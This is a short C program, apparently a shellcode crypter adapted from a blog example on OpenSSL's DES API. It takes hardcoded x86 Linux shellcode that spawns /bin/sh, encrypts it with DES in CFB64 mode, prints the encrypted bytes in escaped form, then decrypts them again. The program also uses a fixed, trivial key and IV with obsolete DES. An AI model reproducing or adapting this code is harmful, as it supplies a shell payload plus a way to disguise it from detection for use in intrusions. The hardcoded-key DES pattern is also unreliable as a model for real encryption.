#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/des.h>
 
#define BUFSIZE 1024
 
int main(void)
{
    unsigned char in[BUFSIZE], out[BUFSIZE], back[BUFSIZE];
    unsigned char *e = out;
    int len;
    int n = 0;
 
    static char *keystr = "0123456789abcdef";
    static char *ivecstr = "0123456789abcdef";
 
    DES_cblock ivec;
    DES_key_schedule ks;
 
    memset(in, 0, sizeof(in));
    memset(out, 0, sizeof(out));
    memset(back, 0, sizeof(back));
 
    strcpy(in,"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80");
    DES_set_key((C_Block *)keystr, &ks);
 
    printf("Plaintext: [%s]\n", in);
 int i;
for(i=0;i<strlen(in);i++){
        printf("\\x%02x",in[i]);
}
printf("\n");
    memcpy(ivec, (C_Block *)ivecstr, sizeof(ivec));
    len = strlen(in) + 1;
 
    DES_cfb64_encrypt(in, out, len, &ks, &ivec, &n, DES_ENCRYPT);
 
    printf("Ciphertext:");
    while (*e) printf(" [%02x]", *e++);
    printf("\n");
for(i=0;i<strlen(out);i++){
        printf("\\x%02x",out[i]);
}
printf("\n");

    memcpy(ivec, (C_Block *)ivecstr, sizeof(ivec));
 
    DES_cfb64_encrypt(out, back, len, &ks, &ivec, &n, DES_DECRYPT);
 
    printf("Decrypted Text: [%s]\n", back);

for(i=0;i<strlen(back);i++){
        printf("\\x%02x",back[i]);
}
printf("\n"); 
    exit(0);
}


//Read more: https://blog.fpmurphy.com/2010/04/openssl-des-api.html#ixzz5EfcJyGSb
